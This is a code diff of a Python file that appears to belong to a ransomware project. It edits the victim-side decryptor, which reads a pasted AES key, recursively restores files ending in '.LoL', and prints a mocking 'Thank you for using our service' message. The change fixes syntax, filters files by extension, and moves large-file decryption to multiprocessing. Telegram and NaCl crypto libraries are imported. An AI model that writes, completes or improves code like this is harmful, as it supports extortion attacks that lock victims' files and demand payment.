@@ -1,9 +1,9 @@
-import telegram, asyncio             ]
-from nacl.public import PrivateKey, PublicKey, Box]
+import telegram, asyncio             
+from nacl.public import PrivateKey, PublicKey, Box
 import nacl, nacl.secret
-from datetime import datetime]
+from datetime import datetime
 from time import sleep
-import os, sys, ctypes, tkinte
+import os, sys, ctypes, tkinter
 from tkinter import messagebox
 from threading import Thread
 import threading
@@ -36,13 +36,13 @@ def setDecryptModule(privateKeyAES):
 class Decryptor:
     def __init__(self, files=0, decryptModule=0):
         self._files=files
-        self._decryptModule=decryptModule
 
+    @classmethod
     def decEach(self, path):
         originName=path.strip(".LoL")
         with open(path, "rb") as File:
             data=File.read()
-        decryptedFile=self._decryptModule.decrypt(data)
+        decryptedFile=DecryptModule.decrypt(data)
         with open(originName, "wb") as File:
             File.write(decryptedFile)
         os.remove(path)
@@ -53,15 +53,21 @@ class Decryptor:
                 if(os.path.isfile(file)==True):
                     if(file==sys.argv[0]):
                         return
+                    extension=os.path.splitext(file)[-1]
+                    if(extension!='.LoL'):
+                        continue;
+                    
                     if(os.path.getsize(file)>50000000):
-                        th=Thread(target=self.decEach(file))
-                        ThreadPool.append(th)
-                        th.start()
-                        
+                        if (len(ThreadPool)<MaxThread):
+                            th=Process(target=Decryptor.decEach, args=(file,))
+                            ThreadPool.append(th)
+                            th.start()
+                        else:
+                            self.decEach(file)
                     else :
                         self.decEach(file)
         except Exception as e:
-            print(f"[DEBUG] Error on EnDecrypt.decryptFile(): {e}")
+            print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")
 
 def listUpTargetDir():
     global PathList, PathList_DEBUG
@@ -72,7 +78,7 @@ def listUpTargetDir():
     #        PathList.append(drive)
     #PathList.remove("c:\\")
     #print(f"[DEBUG] PathList: {PathList}")
-    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\StarCraft"]
+    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\molly"]
 
 
 def recursiveDecrypt(basepath):
@@ -86,7 +92,7 @@ def recursiveDecrypt(basepath):
             dirs.append(absolutePath)
 
     if (len(files)>0):
-        Decryptor(files, DecryptModule).decryptFile()
+        Decryptor(files).decryptFile()
     for dir in dirs:
         recursiveDecrypt(dir)
 
@@ -94,22 +100,25 @@ def recursiveDecrypt(basepath):
 def decryptComputer():
     global entry
     buf=entry.get()
-    AESKey=base64.b64decode(buf)
     try:
+        AESKey=base64.b64decode(buf[10:])
         setDecryptModule(AESKey)
         print("Start Decryption... Do not turn off computer...")
+        start=time.time()
         for drive in PathList_DEBUG:
-            start=time.time()
             recursiveDecrypt(drive)
             while (len(ThreadPool)!=0):
                 th=ThreadPool.pop()
                 th.join()
-            end=time.time()
+        end=time.time()
+        print(end-start)
         print("User computer is unlocked! Thank you for using our service:):):):):) Bye!")
+        
         sleep(10)
         os.remove(filePath)
     except Exception as e:
         print("AESKey is not correct!", e)
+        
 
 def ransomewareWarning():
     global entry
